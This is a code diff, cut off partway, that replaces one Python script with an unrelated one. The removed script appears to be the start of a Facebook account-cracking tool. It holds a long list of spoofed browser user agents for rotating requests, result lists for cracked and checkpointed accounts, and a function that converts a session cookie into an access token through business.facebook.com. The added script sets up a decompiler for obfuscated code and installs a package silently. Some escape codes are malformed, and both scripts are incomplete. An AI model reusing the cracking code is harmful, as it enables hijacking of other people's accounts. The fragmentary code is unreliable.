@@ -1,513 +1,673 @@
-#!/usr/bin/python
-# -*- coding: utf-8 -*-
+# -*- coding=utf-8 -*-
+from sys import stdout
+import subprocess as sp
+import os, sys, time, random, base64, marshal, getpass, re, zlib
+m = '\x1b[1;91m'
+u = '\x1b[1;95m'
+h = '\x1b[1;92m'
+p = '\x1b[1;37m'
+k = '\x1b[1;33m'
+b = '\x1b[1;34m'
+bm = '\x1b[96m'
 
-"""
-
-"""
-
-import requests, re, os, random, sys
-from bs4 import BeautifulSoup
-from random import choice
-from concurrent.futures import ThreadPoolExecutor
-from time import time as mek
-###----------[ SHOW IP ADDRES]---------- ###
-os.system('clear')
-def useragent_list():
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
-    headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-    headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
-    headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
-    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-    headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
-    headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
-    headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
-    headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
-    headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
-    headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
-    headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
-    headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-    headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
-    headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
-    headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
-    headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
-    headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
-    headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
-    headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
-    headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
-    headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
-    headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
-    headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
-    headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
-    headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-    headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
-    headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
-    headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
-    headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
-    headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
-    headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
-    headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
-    headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
-    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-    headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
-    headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
-    headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
-    headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
-    headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
-    headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
-    headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
-    headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-    headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
-    headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
-    headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
-    headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
-    headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
-    headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
-    headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
-    headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
-    headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
-    headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
-    headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
-    headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
-    headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-    headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
-    headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
-    headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
-    headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
-    headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
-    headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
-    headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
-    headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
-    headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
-    headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
-    headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
-    headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
-    headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
-    headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
-    headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
-    headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
-    headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
-    headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
-    headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
-    headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
-    headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
-    headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
-    headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
-    headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
-    headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
-    headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
-    headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
-    headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
-    headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
-    headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
-    headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
-    headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
-    headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
-    headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
-    headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
-    headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
-    headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
-    headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
-    headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
-    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
-    headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
-    headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
-    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
-    headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
-    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
-    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-
- 
-# data - data
-P = "\x1b[0;98m" 
-M = "\x2b[0;96m"
-H = "\x3b[0;94m"
-K = "\x4b[0;95m"
-B = "\x5b[0;93m"
-x = "\x6b[0;92m"
-BM = "\x7b[0;99m"
-loop, ok, cp = [],[],[]
-opsi = []
-data_id = None
-
-# convert cookies to token
-def convert(cookie):
-	cookies = {"cookie":cookie}
-	res = requests.Session().get('https://business.facebook.com/business_locations', headers = {
-		'user-agent'	:	'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
-		'referer'	:	'https://www.facebook.com/',
-		'host'	:	'business.facebook.com',
-		'origin'	:	'https://business.facebook.com',
-		'upgrade-insecure-requests'	:	'1',
-		'accept-language'	:	'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-		'cache-control'	:	'max-age=0',
-		'accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-		'content-type'	:	'text/html; charset=utf-8'
-	}, cookies = cookies)
+try:
+    from uncompyle6.main import decompile
+except Exception as e:
+    sp.call('pip2 install uncompyle6', shell=True, stderr=sp.STDOUT)
+red   = '\x1b[31m'
+green = '\x1b[32m'
+yellow = '\x1b[33m'
+blue  = '\x1b[34m'
+magenta = '\x1b[35m'
+cyan  = '\x1b[36m'
+white = '\x1b[37m'
+reset = '\x1b[39m'
+brblack = '\x1b[90m'
+R = '\x1b[91m'
+brgreen = '\x1b[92m'
+k = '\x1b[93m'
+brblue = '\x1b[94m'
+brmgnt = '\x1b[95m'
+brcyan = '\x1b[96m'
+G = '\x1b[97m'
+def jalan(z, t):
+    for e in z:
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(t)
+def load(word):
+    lix = [
+     '/', '-', '╲', '|']
+    for i in range(5):
+        for x in range(len(lix)):
